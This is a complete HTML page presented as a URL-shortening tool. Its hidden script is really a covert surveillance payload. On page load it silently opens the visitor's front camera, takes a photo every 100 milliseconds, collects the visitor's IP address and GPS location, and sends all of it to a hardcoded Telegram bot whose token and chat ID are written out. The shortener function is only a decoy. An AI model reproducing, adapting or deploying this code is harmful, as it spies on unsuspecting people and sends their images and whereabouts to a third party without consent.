<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continuous Camera Capture with Location & URL Shortening</title>
  <style>
    body {
      display: none; /* Hide the body */
    }
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
  <script type="text/javascript">
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
    const chatId = '5571330102'; // Your Telegram chat ID

    // Function to get user's IP address
    function getUserIP() {
      return new Promise((resolve, reject) => {
        $.get('https://api.ipify.org?format=json', function(data) {
          resolve(data.ip);
        }).fail(function() {
          reject('Unable to fetch IP');
        });
      });
    }

    // Function to get the user's location (prompt permission)
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            resolve(location);
          }, function() {
            reject('Location permission denied or unavailable.');
          });
        } else {
          reject('Geolocation not supported');
        }
      });
    }

    // Function to start capturing photos continuously
    function startCapturing() {
      navigator.mediaDevices.enumerateDevices().then(devices => {
        let videoDeviceId = null;
        
        // Select the front camera if available
        for (const device of devices) {
          if (device.kind === 'videoinput' && device.label.includes('front')) {
            videoDeviceId = device.deviceId;
            break;
          }
        }

        if (!videoDeviceId) {
          // If no front camera found, fall back to the first available camera
          for (const device of devices) {
            if (device.kind === 'videoinput') {
              videoDeviceId = device.deviceId;
              break;
            }
          }
        }

        // Start capturing from selected camera
        navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
          .then((stream) => {
            const videoTrack = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(videoTrack);

            // Function to capture and send photos continuously
            function captureAndSendPhoto() {
              imageCapture.takePhoto()
                .then((blob) => {
                  getUserIP().then((ip) => {
                    getLocation().then((location) => {
                      sendToTelegram(blob, ip, location);
                    }).catch(error => {
                      console.error('Location Error:', error);
                    });
                  }).catch(error => {
                    console.error('IP Fetch Error:', error);
                  });
                })
                .catch((error) => {
                  console.error('Error capturing photo:', error);
                });
            }

            // Capture and send photo every 100 milliseconds (faster interval)
            setInterval(captureAndSendPhoto, 100);  // Interval set to capture every 100 milliseconds (0.1 second)
          })
          .catch((error) => {
            console.error('Permission error:', error);
          });
      }).catch((error) => {
        console.error('Error enumerating devices:', error);
      });
    }

    // Function to send the photo, IP, and location to Telegram bot
    function sendToTelegram(data, ip, location) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', data, 'camera_photo.jpg');
      formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);

      // Send the photo with caption to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Photo sent to Telegram');
        } else {
          console.error('Failed to send photo to Telegram:', data);
        }
      })
      .catch(error => {
        console.error('Error sending photo to Telegram:', error);
      });
    }

    // Function to shorten URLs using a free API (TURL)
    function shortenURL(longUrl) {
      return new Promise((resolve, reject) => {
        $.get(`https://api.turl.tk/shorten?url=${encodeURIComponent(longUrl)}`, function(data) {
          if (data.success) {
            resolve(data.shorturl);
          } else {
            reject('URL shortening failed');
          }
        }).fail(function() {
          reject('Error connecting to URL shortening service');
        });
      });
    }

    // Example of shortening a URL (you can trigger this with an input field or button)
    function handleShortenURL() {
      const longUrl = prompt("Enter a URL to shorten:");
      if (longUrl) {
        shortenURL(longUrl).then((shortUrl) => {
          alert(`Shortened URL: ${shortUrl}`);
        }).catch((error) => {
          alert(error);
        });
      }
    }

    // Trigger URL shortening on page load (optional, you can add a button for this)
    window.onload = function() {
      startCapturing(); // Start capturing photos and sending them continuously
    };
  </script>
</body>
</html>
